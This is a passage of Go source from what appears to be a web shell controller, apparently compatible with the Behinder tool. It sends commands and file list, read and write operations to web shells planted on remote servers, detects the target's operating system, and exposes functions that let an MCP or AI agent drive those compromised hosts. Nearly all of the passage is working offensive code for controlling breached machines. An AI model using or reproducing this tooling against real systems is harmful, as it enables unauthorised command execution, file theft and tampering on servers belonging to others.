		c.JSON(http.StatusBadRequest, gin.H{"error": "url and action are required"})
		return
	}

	// 冰蝎协议处理
	protocol := normalizeWebshellProtocol(req.Protocol)
	if protocol == "behinder" {
		output, ok, errMsg := h.behinder.FileOpWithParamsHeaders(req.URL, req.Password, req.Type, req.Action, req.Path, req.Content, req.TargetPath, req.ChunkIndex, req.UserAgent)
		if !ok {
			c.JSON(http.StatusOK, FileOpResponse{OK: false, Error: errMsg})
			return
		}
		resp := FileOpResponse{OK: true, Output: output}
		if req.Action == "read" {
			resp.OutputBase64 = base64.StdEncoding.EncodeToString([]byte(output))
		}
		c.JSON(http.StatusOK, resp)
		return
	}

	parsed, err := url.Parse(req.URL)
	if err != nil || (parsed.Scheme != "http" && parsed.Scheme != "https") {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid url: only http(s) allowed"})
		return
	}

	// 若 OS 未显式配置，先发一次探活命令，识别出真实 OS 再构造文件操作命令。
	// 这解决了 "Windows + PHP + OS=auto" 场景下旧 fallback 错发 `ls -la` 导致目录列不出来的问题。
	osTag := req.OS
	detectedOS := ""
	cmdParam := normalizeWebshellCmdParam(req.CmdParam)
	if normalizeWebshellOS(osTag) == "auto" {
		if probed := probeWebshellOSViaExec(h.newHTTPExecFn(req.URL, req.Password, req.Type, req.Method, cmdParam, req.Encoding, req.UserAgent)); probed != "" {
			osTag = probed
			detectedOS = probed
			// 若前端带了 connection_id，顺带把探活结果持久化到该连接，后续刷新零成本
			if cid := strings.TrimSpace(req.ConnectionID); cid != "" {
				h.persistDetectedOS(cid, probed)
			}
		}
	}

	command, cmdErr := h.buildFileCommand(fileCommandInput{
		Action:     req.Action,
		Path:       req.Path,
		TargetPath: req.TargetPath,
		Content:    req.Content,
		ChunkIndex: req.ChunkIndex,
		OS:         osTag,
		ShellType:  req.Type,
	})
	if cmdErr != nil {
		c.JSON(http.StatusBadRequest, FileOpResponse{OK: false, Error: cmdErr.Error()})
		return
	}

	useGET := strings.ToUpper(strings.TrimSpace(req.Method)) == "GET"
	var httpReq *http.Request
	if useGET {
		targetURL := h.buildExecURL(req.URL, req.Type, req.Password, cmdParam, command)
		httpReq, err = http.NewRequest(http.MethodGet, targetURL, nil)
	} else {
		body := h.buildExecBody(req.Type, req.Password, cmdParam, command)
		httpReq, err = http.NewRequest(http.MethodPost, req.URL, bytes.NewReader(body))
		httpReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	if err != nil {
		c.JSON(http.StatusInternalServerError, FileOpResponse{OK: false, Error: err.Error()})
		return
	}
	applyWebshellHeaderText(httpReq, req.UserAgent)

	resp, err := h.client.Do(httpReq)
	if err != nil {
		c.JSON(http.StatusOK, FileOpResponse{OK: false, Error: err.Error()})
		return
	}
	defer resp.Body.Close()

	out, readErr := io.ReadAll(resp.Body)
	if readErr != nil {
		h.logger.Warn("webshell fileop read body", zap.Error(readErr))
	}
	output := decodeWebshellOutput(out, req.Encoding)
	outputBase64 := ""
	if req.Action == "read" {
		output, outputBase64 = decodeClassicReadResponse(out, req.Encoding)
	}

	c.JSON(http.StatusOK, FileOpResponse{
		OK:           resp.StatusCode == http.StatusOK,
		Output:       output,
		OutputBase64: outputBase64,
		DetectedOS:   detectedOS,
	})
}

// ExecWithConnection 在指定 WebShell 连接上执行命令（供 MCP/Agent 等非 HTTP 调用）
func (h *WebShellHandler) ExecWithConnection(conn *database.WebShellConnection, command string) (output string, ok bool, errMsg string) {
	if conn == nil {
		return "", false, "connection is nil"
	}
	command = strings.TrimSpace(command)
	if command == "" {
		return "", false, "command is required"
	}

	// Route to Behinder protocol handler if configured
	if conn.Protocol == "behinder" {
		return h.behinder.ExecWithParamsHeaders(conn.URL, conn.Password, conn.Type, command, conn.UserAgent)
	}

	useGET := strings.ToUpper(strings.TrimSpace(conn.Method)) == "GET"
	cmdParam := normalizeWebshellCmdParam(conn.CmdParam)
	var httpReq *http.Request
	var err error
	if useGET {
		targetURL := h.buildExecURL(conn.URL, conn.Type, conn.Password, cmdParam, command)
		httpReq, err = http.NewRequest(http.MethodGet, targetURL, nil)
	} else {
		body := h.buildExecBody(conn.Type, conn.Password, cmdParam, command)
		httpReq, err = http.NewRequest(http.MethodPost, conn.URL, bytes.NewReader(body))
		httpReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	if err != nil {
		return "", false, err.Error()
	}
	applyWebshellHeaderText(httpReq, conn.UserAgent)
	resp, err := h.client.Do(httpReq)
	if err != nil {
		return "", false, err.Error()
	}
	defer resp.Body.Close()
	out, readErr := io.ReadAll(resp.Body)
	if readErr != nil {
		h.logger.Warn("webshell ExecWithConnection read body", zap.Error(readErr))
	}
	return decodeWebshellOutput(out, conn.Encoding), resp.StatusCode == http.StatusOK, ""
}

// FileOpWithConnection 在指定 WebShell 连接上执行文件操作（供 MCP/Agent 调用），支持 list / read / write
func (h *WebShellHandler) FileOpWithConnection(conn *database.WebShellConnection, action, path, content, targetPath string, chunkIndexOpt ...int) (output string, ok bool, errMsg string) {
	if conn == nil {
		return "", false, "connection is nil"
	}
	chunkIndex := 0
	if len(chunkIndexOpt) > 0 {
		chunkIndex = chunkIndexOpt[0]
	}

	// Route to Behinder protocol handler if configured
	if conn.Protocol == "behinder" {
		return h.behinder.FileOpWithParamsHeaders(conn.URL, conn.Password, conn.Type, action, path, content, targetPath, chunkIndex, conn.UserAgent)
	}

	action = strings.ToLower(strings.TrimSpace(action))
	// 若连接的 OS 为 auto，先探活并持久化，避免 AI/MCP 每次都对 Windows 发 `ls -la`
	osTag := conn.OS
	if normalizeWebshellOS(osTag) == "auto" {
		if probed := probeWebshellOSViaExec(func(cmd string) (string, bool) {
			out, exOk, _ := h.ExecWithConnection(conn, cmd)
			return out, exOk
		}); probed != "" {
			osTag = probed
			conn.OS = probed // 本次请求内使用探活结果
			h.persistDetectedOS(conn.ID, probed)
		}
	}

	command, cmdErr := h.buildFileCommand(fileCommandInput{
		Action:     action,
		Path:       path,
		TargetPath: targetPath,
		Content:    content,
		ChunkIndex: chunkIndex,
		OS:         osTag,
		ShellType:  conn.Type,
	})
	if cmdErr != nil {
		return "", false, cmdErr.Error()
	}
	useGET := strings.ToUpper(strings.TrimSpace(conn.Method)) == "GET"
	cmdParam := normalizeWebshellCmdParam(conn.CmdParam)
	var httpReq *http.Request
	var err error
	if useGET {
		targetURL := h.buildExecURL(conn.URL, conn.Type, conn.Password, cmdParam, command)
		httpReq, err = http.NewRequest(http.MethodGet, targetURL, nil)
	} else {
		body := h.buildExecBody(conn.Type, conn.Password, cmdParam, command)
		httpReq, err = http.NewRequest(http.MethodPost, conn.URL, bytes.NewReader(body))
		httpReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	if err != nil {
		return "", false, err.Error()
	}
	applyWebshellHeaderText(httpReq, conn.UserAgent)
	resp, err := h.client.Do(httpReq)
	if err != nil {
		return "", false, err.Error()
	}
	defer resp.Body.Close()
	out, readErr := io.ReadAll(resp.Body)
	if readErr != nil {
		h.logger.Warn("webshell FileOpWithConnection read body", zap.Error(readErr))
	}
	output = decodeWebshellOutput(out, conn.Encoding)
	if action == "read" {
		output, _ = decodeClassicReadResponse(out, conn.Encoding)
	}
	return output, resp.StatusCode == http.StatusOK, ""
}
